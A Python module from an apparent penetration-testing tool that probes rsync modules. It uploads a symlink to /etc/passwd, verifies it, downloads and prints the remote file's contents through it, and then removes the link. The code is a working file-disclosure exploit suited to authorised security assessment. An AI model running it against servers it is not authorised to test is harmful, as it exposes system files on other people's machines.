import os
import subprocess
import tempfile
import uuid

from ptsrvtester.protocols.rsync.utils.registry import rsync_env, rsync_url


__MODULELABEL__ = "Rsync symlink upload probe"
__MODULECODE__ = "symlink"
__ORDER__ = 80

_SYMLINK_TARGET = "/etc/passwd"


def _upload_symlink(ctx, module):
    link_name = f"ptsrvtester_symlink_{uuid.uuid4().hex}"
    env = rsync_env(ctx)

    with tempfile.TemporaryDirectory() as tmpdir:
        local_path = os.path.join(tmpdir, link_name)
        os.symlink(_SYMLINK_TARGET, local_path)
        empty_dir = os.path.join(tmpdir, "empty")
        os.makedirs(empty_dir)

        upload = None
        try:
            upload = subprocess.run(
                [
                    "rsync",
                    "--links",
                    "--no-motd",
                    "--contimeout=5",
                    local_path,
                    rsync_url(ctx, f"{module}/{link_name}"),
                ],
                capture_output=True,
                text=True,
                input="",
                env=env,
                timeout=ctx.timeout,
            )
        except subprocess.TimeoutExpired:
            ctx.out(f"Symlink upload to module {module} timed out", "OK", indent=4)
        except FileNotFoundError:
            ctx.out("rsync client binary not found on this machine", "OK", indent=4)
            return

        if upload is not None:
            if upload.returncode != 0:
                error = upload.stderr.strip().splitlines()
                detail = error[0] if error else f"rsync exited with status {upload.returncode}"
                ctx.out(f"Symlink upload to module {module} was unsuccessful: {detail}", "OK", indent=4)
            else:
                try:
                    print(f"Verifying the uploaded symlink in module {module}/{link_name}")
                    verify = subprocess.run(
                        [
                            "rsync",
                            "--list-only",
                            "--no-motd",
                            "--contimeout=5",
                            "-l",
                            rsync_url(ctx, f"{module}/{link_name}"),
                        ],
                        capture_output=True,
                        text=True,
                        input="",
                        env=env,
                        timeout=ctx.timeout,
                    )
                except subprocess.TimeoutExpired:
                    ctx.out(f"Could not verify the symlink in module {module} (timed out)", "OK", indent=4)
                    verify = None
                except FileNotFoundError:
                    ctx.out("rsync client binary not found on this machine", "ERROR", indent=4)
                    verify = None

                if verify is not None:
                    expected_entry = f"{link_name} -> {_SYMLINK_TARGET}"
                    verified = verify.returncode == 0 and any(
                        line.lstrip().startswith("l") and line.rstrip().endswith(expected_entry)
                        for line in verify.stdout.splitlines()
                    )
                    if verified:
                        ctx.out(f"Uploaded and verified symlink to {_SYMLINK_TARGET} in module {module}", "VULN", indent=4)
                        contents_path = os.path.join(tmpdir, "remote_passwd")
                        try:
                            read_result = subprocess.run(
                                [
                                    "rsync",
                                    "--copy-links",
                                    "--no-motd",
                                    "--contimeout=5",
                                    rsync_url(ctx, f"{module}/{link_name}"),
                                    contents_path,
                                ],
                                capture_output=True,
                                text=True,
                                input="",
                                env=env,
                                timeout=ctx.timeout,
                            )
                        except subprocess.TimeoutExpired:
                            ctx.out(f"Timed out reading {_SYMLINK_TARGET} through the verified symlink", "OK", indent=4)
                        except FileNotFoundError:
                            ctx.out("rsync client binary not found on this machine", "ERROR", indent=4)
                        else:
                            if read_result.returncode == 0 and os.path.isfile(contents_path):
                                with open(contents_path, encoding="utf-8") as passwd_file:
                                    contents = passwd_file.read()
                                ctx.out(f"Contents read through the remote symlink in module {module}:", "INFO", indent=4)
                                ctx.out(contents, "TEXT", indent=8)
                            else:
                                detail = read_result.stderr.strip().splitlines()
                                detail = detail[0] if detail else (
                                    f"rsync exited with status {read_result.returncode}"
                                    if read_result.returncode != 0
                                    else "rsync did not create the downloaded file"
                                )
                                ctx.out(f"Could not read {_SYMLINK_TARGET} through the verified symlink: {detail}", "OK", indent=4)
                    else:
                        ctx.out(f"Symlink upload to module {module} could not be verified", "OK", indent=4)

        try:
            cleanup = subprocess.run(
                [
                    "rsync",
                    "-r",
                    "--no-motd",
                    "--contimeout=5",
                    "--delete",
                    "--include",
                    link_name,
                    "--exclude",
                    "*",
                    f"{empty_dir}/",
                    rsync_url(ctx, f"{module}/"),
                ],
                capture_output=True,
                text=True,
                input="",
                env=env,
                timeout=ctx.timeout,
            )
        except subprocess.TimeoutExpired:
            ctx.out(f"Could not confirm removal of the symlink probe from module {module} (timed out)", "OK", indent=4)
        except FileNotFoundError:
            ctx.out("rsync client binary not found on this machine", "O", indent=4)
        else:
            if cleanup.returncode != 0:
                ctx.out(f"Could not remove the symlink probe from module {module}", "OK", indent=4)
                ctx.debug(f"Symlink probe cleanup failed: {cleanup.stderr.strip()}")


def run(ctx):
    if not ctx.modules:
        ctx.out("No modules available to probe for symlink uploads", "OK", indent=4)
        return

    for module in ctx.modules:
        _upload_symlink(ctx, module)
